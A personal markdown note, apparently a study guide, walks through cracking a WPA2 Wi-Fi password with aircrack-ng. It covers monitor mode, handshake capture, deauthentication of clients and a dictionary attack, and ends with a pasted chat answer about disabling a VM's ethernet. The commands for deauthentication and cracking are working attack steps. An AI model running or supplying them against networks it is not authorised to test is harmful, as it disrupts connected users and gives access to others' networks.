
## Use aircrack-ng to access a Wi-Fi with [[WPA2]] or weakest security

### 1. First we enable [[Monitor Mode]] on the [[Network Interface Card (NIC)]]

```bash
airmon-ng start wlan0
```
>[!Note] Check the interface name (usually it is wlan0, you can check it with `ifconfig` which will list the interfaces. If you are in a VM, you need an external Wi-Fi USB device.

### 2. Capture [[Handshake Packets]]

To capture this packets, we need to find nearby networks:

``` bash
airodump-ng wlan0
```
>[!Note] Remember to check the name of the interface. Here you will see the mac addresses and the SSID of the nearby networks.  If you want to save the logs in a file, you can use the -w flag. e.g. `airodump-ng -w networks_list wlan0`

Once you see the network you want to hack (your network or a network you're authorized to hack), start capturing packets:

airodump-ng -c [CHANNEL] --bssid [MAC_ROUTER] -w capture wlan0mon
Replace [CHANNEL] with the Wi-Fi channel and [MAC_ROUTER] with your router's MAC address.

3. Deauthenticate a Client (Force Handshake)
In a new terminal, send deauth packets to force a device to reconnect:

bash

aireplay-ng --deauth 5 -a [MAC_ROUTER] -c [MAC_CLIENT] wlan0mon
Wait until airodump-ng captures the handshake (top-right corner).

4. Crack the Password with a Dictionary
Run Aircrack-ng with your dictionary:


aircrack-ng -w mypasswords.txt -b [MAC_ROUTER] capture*.cap
If your password is in the dictionary, Aircrack-ng will find it!





should I disable my ethernet connection of the vm?

Not necessarily, but it depends on your setup.

If your VM is using Ethernet for internet and your Wi-Fi adapter is dedicated to monitor mode, you can keep Ethernet on.
If you're unsure, disabling Ethernet ensures all traffic is handled via Wi-Fi, avoiding conflicts.
To disable it:

bash
ifconfig eth0 down  # or
ip link set eth0 down
Re-enable it with:

bash
ifconfig eth0 up  # or
ip link set eth0 up
If everything works fine with Ethernet on, no need to disable it! 🚀